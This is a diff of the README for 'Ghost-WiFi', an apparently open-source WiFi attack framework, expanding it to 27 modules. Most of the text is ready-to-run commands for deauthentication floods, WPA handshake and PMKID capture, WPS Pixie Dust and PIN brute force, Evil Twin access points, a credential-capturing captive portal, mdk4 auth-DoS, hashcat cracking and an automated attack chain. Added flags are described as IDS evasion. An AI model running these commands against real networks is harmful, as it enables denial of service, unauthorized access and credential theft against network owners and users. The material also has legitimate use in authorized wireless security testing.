@@ -4,10 +4,10 @@
 
 [![Ghost-WiFi](https://img.shields.io/badge/Ghost--WiFi-WiFi%20Security-red?style=for-the-badge)](https://github.com/Ghost-Bx1/ghost-wifi)
 
-> WiFi attack framework - monitor mode, deauth, WPA/WPA2 handshake capture, PMKID, WPS Pixie Dust, Evil Twin, and cracking.
+> WiFi attack and audit framework - 27 modules: monitor mode, deauth, WPA/WPA2 handshake, PMKID, WPS, Evil Twin, cracking, radar/distance mapping, and more.
 
 ```
-  GHOST-WIFI  v1.0.0  |  WiFi Attack & Audit Framework
+  GHOST-WIFI  v3.1.0  |  WiFi Attack & Audit Framework
   By Gh0st-Bx1        |  github.com/Ghost-Bx1
 ```
 
@@ -22,25 +22,40 @@
 
 ## Overview
 
-Ghost-WiFi is a comprehensive WiFi attack and audit framework. It wraps the full aircrack-ng suite with clean CLI ergonomics, adds PMKID (clientless WPA2), WPS Pixie Dust/PIN brute-force, Evil Twin AP setup, KARMA attack, channel hopping, client tracking, WEP cracking, and offline handshake cracking via aircrack-ng or hashcat.
+Ghost-WiFi is a comprehensive WiFi attack and audit framework. Zero pip dependencies (stdlib only, optional colorama). Wraps the full aircrack-ng suite with clean CLI ergonomics.
 
-| Module       | Technique                                                      |
-|--------------|----------------------------------------------------------------|
-| `ifaces`     | List wireless interfaces, mode, driver, MAC                   |
-| `monitor`    | Start/stop/check monitor mode via airmon-ng                   |
-| `scan`       | Passive AP + client scan with airodump-ng, JSON export        |
-| `hop`        | Channel hopping across selected channels                      |
-| `deauth`     | 802.11 deauthentication flood (broadcast or targeted)         |
-| `capture`    | WPA/WPA2 4-way handshake capture with auto deauth trigger     |
-| `pmkid`      | Clientless PMKID capture with hcxdumptool + hashcat export    |
-| `wps`        | WPS scan, Pixie Dust (reaver -K), PIN brute-force, bully      |
-| `evil-twin`  | Rogue AP with hostapd + dnsmasq DHCP, captive portal ready    |
-| `crack`      | Offline cracking via aircrack-ng (CPU) or hashcat (GPU)       |
-| `wep`        | WEP cracking: ARP injection, fragmentation, chop-chop         |
-| `clients`    | Track clients per AP, log MACs and probed ESSIDs              |
-| `karma`      | KARMA attack - respond to all probe requests                  |
-| `handshake`  | Verify, convert (.hc22000/.hccapx), or strip capture files   |
-| `info`       | Dependency checker - shows installed/missing tools            |
+| Module           | Technique                                                       |
+|------------------|-----------------------------------------------------------------|
+| `ifaces`         | List wireless interfaces, mode, driver, MAC                    |
+| `monitor`        | Start/stop/check monitor mode via airmon-ng                    |
+| `scan`           | Passive AP + client scan with airodump-ng, JSON export         |
+| `hop`            | Channel hopping across selected channels                       |
+| `deauth`         | 802.11 deauthentication flood (broadcast or targeted)          |
+| `capture`        | WPA/WPA2 4-way handshake capture with auto deauth trigger      |
+| `pmkid`          | Clientless PMKID capture with hcxdumptool + hashcat export     |
+| `wps`            | WPS scan, Pixie Dust (reaver -K), PIN brute-force, bully       |
+| `evil-twin`      | Rogue AP with hostapd + dnsmasq DHCP, captive portal ready     |
+| `crack`          | Offline cracking via aircrack-ng (CPU) or hashcat (GPU)        |
+| `wep`            | WEP cracking: ARP injection, fragmentation, chop-chop          |
+| `clients`        | Track clients per AP, log MACs and probed ESSIDs               |
+| `karma`          | KARMA attack - respond to all probe requests                   |
+| `handshake`      | Verify, convert (.hc22000/.hccapx), or strip capture files    |
+| `info`           | Dependency checker - shows installed/missing tools             |
+| `auto`           | Automated attack chain: scan -> deauth -> capture              |
+| `decloak`        | Hidden SSID detection via probe/association                    |
+| `eapol`          | EAPOL frame re-injection                                       |
+| `signal`         | Live RSSI tracking with signal bar + estimated distance        |
+| `nic-detect`     | Deep NIC analysis: chipset, injection, bands, TX power, bus    |
+| `beacon-flood`   | Beacon flood with fake SSIDs via aireplay-ng                   |
+| `probe-hunt`     | Capture probe requests and build device map                    |
+| `captive-portal` | Standalone HTTP captive portal for credential capture          |
+| `mdk4`           | MDK4 wrapper: beacon/deauth/auth-DoS/probe/EAPOL/TKIP attacks  |
+| `fingerprint`    | AP and client fingerprinting with vendor OUI lookup            |
+| `injection-test` | Test packet injection capability on a monitor interface        |
+| `channelfix`     | Force a specific channel on a wireless interface               |
+| `5ghz-scan`      | Dedicated 5GHz band scan                                       |
+| `radar`          | WiFi radar: ASCII map of all APs sorted by estimated distance  |
+| `distance`       | Quick RSSI-to-distance scan of all visible networks            |
 
 ---
 
@@ -63,13 +78,15 @@ Optional by module:
   dnsmasq       - Evil Twin DHCP/DNS
   bettercap     - KARMA, MITM framework
   macchanger    - MAC address randomization
+  mdk4          - Beacon flood, auth-DoS, TKIP MIC attacks
   john          - CPU-based hash cracking
+  iw            - signal, distance, nic-detect, 5ghz-scan
 ```
 
 ```bash
 # Install core + common extras (Debian/Ubuntu/Kali):
 sudo apt install aircrack-ng reaver bully hcxdumptool hcxtools \
-                 hashcat hostapd dnsmasq bettercap macchanger
+                 hashcat hostapd dnsmasq bettercap macchanger mdk4 iw
 ```
 
 ---
@@ -128,6 +145,10 @@ sudo python ghost-wifi.py deauth -i wlan0mon --bssid AA:BB:CC:DD:EE:FF
 # Target specific client, 10 frames
 sudo python ghost-wifi.py deauth -i wlan0mon --bssid AA:BB:CC:DD:EE:FF \
     --client 11:22:33:44:55:66 --count 10 --channel 6
+
+# Randomize interval between bursts (IDS evasion)
+sudo python ghost-wifi.py deauth -i wlan0mon --bssid AA:BB:CC:DD:EE:FF \
+    --rand-interval --interval-min 2 --interval-max 8
 ```
 
 ### Capture WPA/WPA2 handshake
@@ -140,19 +161,15 @@ sudo python ghost-wifi.py capture -i wlan0mon \
 # Passive mode only (no deauth)
 sudo python ghost-wifi.py capture -i wlan0mon \
     --bssid AA:BB:CC:DD:EE:FF --channel 6 --passive --timeout 180
-
-# Output prefix
-sudo python ghost-wifi.py capture -i wlan0mon \
-    --bssid AA:BB:CC:DD:EE:FF --channel 6 -o home_capture
 ```
 
 ### PMKID attack (clientless WPA2)
 
 ```bash
-# Capture PMKID from all APs (60s)
+# Capture PMKID from all APs
 sudo python ghost-wifi.py pmkid -i wlan0mon --duration 60
 
-# Target specific AP, save to file
+# Target specific AP
 sudo python ghost-wifi.py pmkid -i wlan0mon \
     --bssid AA:BB:CC:DD:EE:FF --duration 90 -o pmkid.pcapng
 ```
@@ -163,15 +180,15 @@ sudo python ghost-wifi.py pmkid -i wlan0mon \
 # Scan for WPS-enabled APs
 sudo python ghost-wifi.py wps -i wlan0mon --action scan
 
-# Pixie Dust attack (fastest, seconds to minutes)
+# Pixie Dust attack
 sudo python ghost-wifi.py wps -i wlan0mon --bssid AA:BB:CC:DD:EE:FF \
     --channel 6 --action pixie
 
-# PIN brute-force (slow, use Pixie Dust first)
+# PIN brute-force
 sudo python ghost-wifi.py wps -i wlan0mon --bssid AA:BB:CC:DD:EE:FF \
     --channel 6 --action pin
 
-# Bully (alternative WPS attacker)
+# Bully (alternative)
 sudo python ghost-wifi.py wps -i wlan0mon --bssid AA:BB:CC:DD:EE:FF \
     --channel 6 --action bully
 ```
@@ -187,7 +204,7 @@ sudo python ghost-wifi.py evil-twin -i wlan0 \
     --essid "HomeNetwork" --bssid AA:BB:CC:DD:EE:FF --channel 11
 ```
 
-Clients that connect receive DHCP from 192.168.1.x. Combine with a captive portal for credential harvesting in authorized red team assessments.
+Clients that connect receive DHCP from 192.168.1.x. Combine with `captive-portal` for credential capture in authorized red team assessments.
 
 ### Crack handshake offline
 
@@ -202,6 +219,14 @@ python ghost-wifi.py crack --cap hashes.hc22000 --hashcat \
 # With hashcat rules
 python ghost-wifi.py crack --cap hashes.hc22000 --hashcat \
     --wordlist wordlist.txt --rules /usr/share/hashcat/rules/best64.rule
+
+# Mask attack
+python ghost-wifi.py crack --cap hashes.hc22000 --hashcat \
+    --mask "?d?d?d?d?d?d?d?d"
+
+# Combo attack (two wordlists)
+python ghost-wifi.py crack --cap hashes.hc22000 \
+    --wordlist names.txt --wordlist2 numbers.txt
 ```
 
 ### WEP cracking
@@ -223,7 +248,7 @@ sudo python ghost-wifi.py wep -i wlan0mon \
 ### Client tracking
 
 ```bash
-# Track all clients (all APs)
+# Track all clients
 sudo python ghost-wifi.py clients -i wlan0mon --duration 60
 
 # Track clients of specific AP
@@ -261,6 +286,143 @@ python ghost-wifi.py handshake --cap capture-01.cap --action convert -o hashes.h
 python ghost-wifi.py handshake --cap capture-01.cap --action strip -o clean.cap
 ```
 
+### Automated attack chain
+
+```bash
+# Full auto: scan -> select target -> deauth -> capture
+sudo python ghost-wifi.py auto -i wlan0mon --duration 60
+```
+
+### Hidden SSID detection
+
+```bash
+sudo python ghost-wifi.py decloak -i wlan0mon --channel 6
+```
+
+### Signal tracking
+
+```bash
+# Track live RSSI + estimated distance for a specific AP
+sudo python ghost-wifi.py signal -i wlan0mon --bssid AA:BB:CC:DD:EE:FF \
+    --duration 60 --interval 2
+```
+
+Shows a live bar like `[||||||||||||............] -65 dBm  ~18m`
+
+### NIC analysis
+
+```bash
+# Deep chipset, driver, injection, band, TX power analysis
+sudo python ghost-wifi.py nic-detect
+sudo python ghost-wifi.py nic-detect -i wlan0
+```
+
+### Beacon flood
+
+```bash
+# Flood with 500 fake SSIDs
+sudo python ghost-wifi.py beacon-flood -i wlan0mon --count 500
+```
+
+### Probe request capture
+
+```bash
+# Build a map of devices searching for networks
+sudo python ghost-wifi.py probe-hunt -i wlan0mon --duration 60 -o probes.json
+```
+
+### Captive portal
+
+```bash
+# Start HTTP credential capture portal on port 8080
+sudo python ghost-wifi.py captive-portal --port 8080
+```
+
+### MDK4 attacks
+
+```bash
+# Beacon flood
+sudo python ghost-wifi.py mdk4 -i wlan0mon --mode b
+
+# Deauth all clients
+sudo python ghost-wifi.py mdk4 -i wlan0mon --mode d --bssid AA:BB:CC:DD:EE:FF
+
+# Auth DoS
+sudo python ghost-wifi.py mdk4 -i wlan0mon --mode a --bssid AA:BB:CC:DD:EE:FF
+```
+
+### AP and client fingerprinting
+
+```bash
+sudo python ghost-wifi.py fingerprint -i wlan0mon --duration 30 -o fingerprint.json
+```
+
+### Injection test
+
+```bash
+sudo python ghost-wifi.py injection-test -i wlan0mon
+
+# Extended test against specific AP
+sudo python ghost-wifi.py injection-test -i wlan0mon --bssid AA:BB:CC:DD:EE:FF
+```
+
+### 5GHz scan
+
+```bash
+sudo python ghost-wifi.py 5ghz-scan -i wlan0mon --duration 30 -o 5ghz.json
+```
+
+---
+
+## Distance Estimation (v3.1.0+)
+
+Ghost-WiFi uses the **Log Distance Path Loss model** to estimate the physical distance to each access point from its RSSI (signal strength in dBm):
+
+```
+d = 10 ^ ((TxPower - RSSI) / (10 * n))
+```
+
+Where:
+- `RSSI` - measured signal strength in dBm (e.g. -65)
+- `TxPower` - reference power at 1 meter (default: -50 dBm)
+- `n` - path loss exponent (configure with `--path-n`):
+  - `2.0` - free space / outdoor line-of-sight
+  - `2.7` - typical indoor environment (default)
+  - `3.5` - heavy walls / obstructed environment
+
+Distances are **estimates** - real-world accuracy depends on the environment, AP hardware, and obstacles. Use as a relative proximity guide, not an exact measurement.
+
+### WiFi Radar - ASCII map sorted by distance
+
+```bash
+# Scan 20s and show all APs by proximity
+sudo python ghost-wifi.py radar -i wlan0mon
+
+# Scan 30s, 5GHz, show only 10 closest
+sudo python ghost-wifi.py radar -i wlan0mon --duration 30 --band a --top 10
+
+# Indoor environment tuning
+sudo python ghost-wifi.py radar -i wlan0mon --path-n 3.5
+
+# Save to JSON
+sudo python ghost-wifi.py radar -i wlan0mon -o radar.json
+```
+
+Color coding: green = <15m, yellow = 15-50m, red = >50m
+
+### Quick distance scan
+
+```bash
+# Scan all visible networks and show estimated distance
+sudo python ghost-wifi.py distance -i wlan0mon
+
+# Filter by specific AP
+sudo python ghost-wifi.py distance -i wlan0mon --bssid AA:BB:CC:DD:EE:FF
+
+# Free space tuning (outdoor)
+sudo python ghost-wifi.py distance -i wlan0mon --path-n 2.0 --tx-power -40
+```
+
 ---
 
 ## Reference
@@ -284,13 +446,18 @@ python ghost-wifi.py handshake --cap capture-01.cap --action strip -o clean.cap
 
 ### `deauth` flags
 
-| Flag              | Description                                            |
-|-------------------|--------------------------------------------------------|
-| `-i / --interface`| Monitor mode interface (required)                      |
-| `--bssid`         | Target AP MAC address (required)                       |
-| `--client`        | Target client MAC (default: broadcast FF:FF:FF:FF:FF:FF)|
-| `--count N`       | Number of deauth frames (0 = continuous)               |
-| `--channel N`     | AP channel                                             |
+| Flag                | Description                                                       |
+|---------------------|-------------------------------------------------------------------|
+| `-i / --interface`  | Monitor mode interface (required)                                 |
+| `--bssid`           | Target AP MAC address                                             |
+| `--bssid-list`      | Comma-separated BSSIDs for multi-target rotation                  |
+| `--client`          | Target client MAC (default: broadcast FF:FF:FF:FF:FF:FF)          |
+| `--count N`         | Deauth frames per burst (0 = continuous)                          |
+| `--channel N`       | AP channel                                                        |
+| `--mac-rand`        | Randomize source MAC before attack                                |
+| `--rand-interval`   | Randomize delay between bursts (IDS evasion)                      |
+| `--interval-min N`  | Minimum delay seconds (default: 1.0)                              |
+| `--interval-max N`  | Maximum delay seconds (default: 5.0)                              |
 
 ### `capture` flags
 
@@ -302,15 +469,7 @@ python ghost-wifi.py handshake --cap capture-01.cap --action strip -o clean.cap
 | `--channel N`     | AP channel                                             |
 | `--passive`       | No deauth - passive capture only                       |
 | `--timeout N`     | Max wait time in seconds (default: 120)                |
-
-### `wps` flags
-
-| Flag              | Description                                            |
-|-------------------|--------------------------------------------------------|
-| `--action`        | scan, pixie, pin, bully                                |
-| `--bssid`         | Target AP MAC                                          |
-| `--channel N`     | AP channel                                             |
-| `--pin`           | Known PIN to test (pin action)                         |
+| `--mac-rand`      | Randomize MAC before capture                           |
 
 ### `crack` flags
 
@@ -318,13 +477,44 @@ python ghost-wifi.py handshake --cap capture-01.cap --action strip -o clean.cap
 |-------------------|--------------------------------------------------------|
 | `--cap`           | Capture file (.cap, .hc22000)                          |
 | `--wordlist`      | Wordlist file (default: built-in mini-list)            |
+| `--wordlist2`     | Second wordlist for combo attack                       |
 | `--hashcat`       | Use hashcat instead of aircrack-ng                     |
 | `--hash-mode N`   | Hashcat mode (default: 22000 for WPA2)                 |
 | `--rules FILE`    | Hashcat rules file                                     |
+| `--mask`          | Hashcat mask attack pattern (e.g. `?d?d?d?d?d?d?d?d`) |
+
+### `radar` flags
+
+| Flag              | Description                                            |
+|-------------------|--------------------------------------------------------|
+| `-i / --interface`| Monitor interface (auto-detect if omitted)             |
+| `--duration N`    | Scan duration in seconds (default: 20)                 |
+| `--band`          | Frequency band: a, b, abg, abgn                        |
+| `--top N`         | Show only N closest networks                           |
+| `--path-n N`      | Path loss exponent (default: 2.7)                      |
+| `--tx-power N`    | Reference TX power at 1m in dBm (default: -50)         |
+
+### `distance` flags
+
+| Flag              | Description                                            |
+|-------------------|--------------------------------------------------------|
+| `-i / --interface`| Wireless interface (auto-detect if omitted)            |
+| `--bssid`         | Filter by specific BSSID                               |
+| `--path-n N`      | Path loss exponent (default: 2.7)                      |
+| `--tx-power N`    | Reference TX power at 1m in dBm (default: -50)         |
+
+### `signal` flags
+
+| Flag              | Description                                            |
+|-------------------|--------------------------------------------------------|
+| `-i / --interface`| Wireless interface (required)                          |
+| `--bssid`         | Target AP BSSID (required)                             |
+| `--duration N`    | Tracking duration in seconds (default: 30)             |
+| `--interval N`    | Reading interval in seconds (default: 2)               |
 
 ---
 
-## Attack Workflow
+## Attack Workflows
 
 ### WPA2 Personal (fastest path)
 
@@ -351,6 +541,21 @@ sudo python ghost-wifi.py wps -i wlan0mon --action scan
 sudo python ghost-wifi.py wps -i wlan0mon --bssid TARGET_BSSID --channel 6 --action pixie
 ```
 
+### WiFi reconnaissance
+
+```bash
+# Step 1 - Build a proximity map
+sudo python ghost-wifi.py radar -i wlan0mon --duration 30
+
+# Step 2 - Fingerprint APs and clients
+sudo python ghost-wifi.py fingerprint -i wlan0mon --duration 30
+
+# Step 3 - Probe requests (what devices are searching for)
+sudo python ghost-wifi.py probe-hunt -i wlan0mon --duration 60
+```
+
+---
+
 ## Ghost Toolkit
 
 | Tool | Description |
@@ -365,7 +570,7 @@ sudo python ghost-wifi.py wps -i wlan0mon --bssid TARGET_BSSID --channel 6 --act
 | [ghost-scan](https://github.com/Ghost-Bx1/ghost-scan) | Port Scanner - async TCP/UDP scanner with banner grabbing and CVE correlation |
 | [ghost-shell](https://github.com/Ghost-Bx1/ghost-shell) | Payload Generation - reverse shell and web shell generator, 25+ languages |
 | [ghost-spray](https://github.com/Ghost-Bx1/ghost-spray) | Credential Attacks - password spraying, stuffing, default credential testing |
-| [ghost-wifi](https://github.com/Ghost-Bx1/ghost-wifi) | WiFi Attacks - monitor mode, deauth, WPA/WPA2 capture, PMKID, WPS, Evil Twin |
+| [ghost-wifi](https://github.com/Ghost-Bx1/ghost-wifi) | WiFi Attacks - monitor mode, deauth, WPA/WPA2 capture, PMKID, WPS, Evil Twin, radar |
 
 ---
 
